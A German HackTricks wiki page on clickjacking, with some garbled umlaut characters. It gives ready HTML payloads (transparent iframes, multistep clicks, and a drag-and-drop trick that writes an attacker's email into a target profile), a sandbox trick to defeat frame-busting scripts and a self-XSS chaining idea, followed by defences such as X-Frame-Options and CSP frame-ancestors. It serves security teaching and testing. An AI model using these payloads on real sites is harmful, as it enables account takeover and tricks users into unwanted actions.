# Clickjacking

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking), um einfach **Workflows zu erstellen und zu automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## Was ist Clickjacking

Bei einem Clickjacking-Angriff wird ein **Benutzer** dazu **get√§uscht**, auf ein **Element** auf einer Webseite zu **klicken**, das entweder **unsichtbar** ist oder als anderes Element getarnt ist. Diese Manipulation kann zu unbeabsichtigten Folgen f√ºr den Benutzer f√ºhren, wie dem Herunterladen von Malware, der Weiterleitung zu b√∂sartigen Webseiten, der Bereitstellung von Anmeldeinformationen oder sensiblen Informationen, Geldtransfers oder dem Online-Kauf von Produkten.

### Trick zum Vorabf√ºllen von Formularen

Manchmal ist es m√∂glich, den Wert von Feldern eines Formulars mithilfe von GET-Parametern beim Laden einer Seite zu **f√ºllen**. Ein Angreifer kann dieses Verhalten ausnutzen, um ein Formular mit beliebigen Daten auszuf√ºllen und das Clickjacking-Payload zu senden, damit der Benutzer die Schaltfl√§che "Senden" dr√ºckt.

### Formular mit Drag\&Drop ausf√ºllen

Wenn Sie m√∂chten, dass der Benutzer ein Formular **ausf√ºllt**, aber ihn nicht direkt auffordern m√∂chten, bestimmte Informationen einzugeben (wie die E-Mail und/oder ein spezifisches Passwort, das Sie kennen), k√∂nnen Sie ihn einfach bitten, etwas per **Drag\&Drop** zu verschieben, das Ihre gesteuerten Daten schreibt, wie in [**diesem Beispiel**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Grundlegendes Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Mehrstufige Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Klick Payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Wenn Sie einen **XSS-Angriff identifiziert haben, der erfordert, dass ein Benutzer auf ein Element klickt**, um den XSS auszul√∂sen, und die Seite **anf√§llig f√ºr Clickjacking ist**, k√∂nnten Sie es missbrauchen, um den Benutzer dazu zu bringen, auf die Schaltfl√§che/den Link zu klicken.  
Beispiel:  
_Sie haben ein **Self-XSS** in einigen privaten Details des Kontos gefunden (Details, die **nur Sie setzen und lesen k√∂nnen**). Die Seite mit dem **Formular** zum Einstellen dieser Details ist **anf√§llig** f√ºr **Clickjacking**, und Sie k√∂nnen das **Formular** mit den GET-Parametern **vorab ausf√ºllen**._  
\_\_Ein Angreifer k√∂nnte einen **Clickjacking**-Angriff auf diese Seite vorbereiten, das **Formular mit dem XSS-Payload vorab ausf√ºllen** und den **Benutzer dazu bringen, das Formular zu **√ºbermitteln**. Wenn das Formular √ºbermittelt wird und die Werte ge√§ndert werden, wird der **Benutzer den XSS ausf√ºhren**.

## Strategien zur Minderung von Clickjacking

### Abwehrma√ünahmen auf Clientseite

Skripte, die auf der Clientseite ausgef√ºhrt werden, k√∂nnen Aktionen ausf√ºhren, um Clickjacking zu verhindern:

* Sicherstellen, dass das Anwendungsfenster das Haupt- oder oberste Fenster ist.
* Alle Frames sichtbar machen.
* Klicken auf unsichtbare Frames verhindern.
* Erkennen und Benutzer √ºber m√∂gliche Clickjacking-Versuche informieren.

Diese Frame-Busting-Skripte k√∂nnen jedoch umgangen werden:

* **Sicherheitseinstellungen der Browser:** Einige Browser k√∂nnen diese Skripte basierend auf ihren Sicherheitseinstellungen oder dem Fehlen von JavaScript-Unterst√ºtzung blockieren.
* **HTML5 iframe `sandbox`-Attribut:** Ein Angreifer kann Frame-Buster-Skripte neutralisieren, indem er das `sandbox`-Attribut mit den Werten `allow-forms` oder `allow-scripts` ohne `allow-top-navigation` setzt. Dadurch wird verhindert, dass das iframe √ºberpr√ºft, ob es das oberste Fenster ist, z. B.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Die Werte `allow-forms` und `allow-scripts` erm√∂glichen Aktionen innerhalb des Iframes und deaktivieren die Navigation auf Top-Level. Um die beabsichtigte Funktionalit√§t der angegriffenen Website sicherzustellen, k√∂nnen zus√§tzliche Berechtigungen wie `allow-same-origin` und `allow-modals` je nach Angriffstyp erforderlich sein. Browser-Konsolenmeldungen k√∂nnen dabei helfen, welche Berechtigungen zuzulassen sind.

### Serverseitige Abwehrma√ünahmen

#### X-Frame-Options

Der **HTTP-Antwortheader `X-Frame-Options`** informiert Browser √ºber die Legitimit√§t des Renderns einer Seite in einem `<frame>` oder `<iframe>`, um Clickjacking zu verhindern:

- `X-Frame-Options: deny` - Keine Domain kann den Inhalt rahmen.
- `X-Frame-Options: sameorigin` - Nur die aktuelle Website kann den Inhalt rahmen.
- `X-Frame-Options: allow-from https://trusted.com` - Nur die angegebene 'uri' kann die Seite rahmen.
- Beachten Sie die Einschr√§nkungen: Wenn der Browser diese Direktive nicht unterst√ºtzt, funktioniert sie m√∂glicherweise nicht. Einige Browser bevorzugen die CSP frame-ancestors Direktive.

#### Content Security Policy (CSP) frame-ancestors Direktive

Die **`frame-ancestors` Direktive in CSP** ist die empfohlene Methode zum Schutz vor Clickjacking:

- `frame-ancestors 'none'` - √Ñhnlich wie `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - √Ñhnlich wie `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - √Ñhnlich wie `X-Frame-Options: allow-from`.

Beispielsweise erlaubt die folgende CSP nur das Einbetten von der gleichen Domain:

`Content-Security-Policy: frame-ancestors 'self';`

Weitere Details und komplexe Beispiele finden Sie in der [frame-ancestors CSP-Dokumentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) und in der [Mozilla CSP frame-ancestors Dokumentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) mit `child-src` und `frame-src`

**Content Security Policy (CSP)** ist eine Sicherheitsma√ünahme, die hilft, Clickjacking und andere Code-Injektionsangriffe zu verhindern, indem festgelegt wird, welche Quellen der Browser zum Laden von Inhalten zulassen soll.

#### `frame-src` Direktive

- Definiert g√ºltige Quellen f√ºr Frames.
- Spezifischer als die `default-src` Direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames aus der gleichen Quelle (self) und https://trusted-website.com.

#### `child-src` Direktive

* Wurde in CSP Level 2 eingef√ºhrt, um g√ºltige Quellen f√ºr Web Workers und Frames festzulegen.
* Dient als Fallback f√ºr frame-src und worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Diese Richtlinie erlaubt Frames und Worker aus der gleichen Quelle (self) und https://trusted-website.com.

**Verwendungshinweise:**

* Veraltung: child-src wird zugunsten von frame-src und worker-src abgeschafft.
* Fallback-Verhalten: Wenn frame-src fehlt, wird child-src als Fallback f√ºr Frames verwendet. Wenn beide fehlen, wird default-src verwendet.
* Strikte Quellendefinition: F√ºgen Sie nur vertrauensw√ºrdige Quellen in die Direktiven ein, um Ausnutzungen zu verhindern.

#### JavaScript Frame-Breaking Scripts

Obwohl nicht vollst√§ndig narrensicher, k√∂nnen JavaScript-basierte frame-busting Skripte verwendet werden, um zu verhindern, dass eine Webseite eingerahmt wird. Beispiel:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Verwendung von Anti-CSRF-Token

* **Token-Validierung:** Verwenden Sie Anti-CSRF-Token in Webanwendungen, um sicherzustellen, dass zustands√§ndernde Anfragen absichtlich vom Benutzer und nicht √ºber eine Clickjacking-Seite erfolgen.

## Referenzen

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking), um einfach Workflows zu erstellen und zu automatisieren, die von den weltweit fortschrittlichsten Community-Tools unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.

</details>
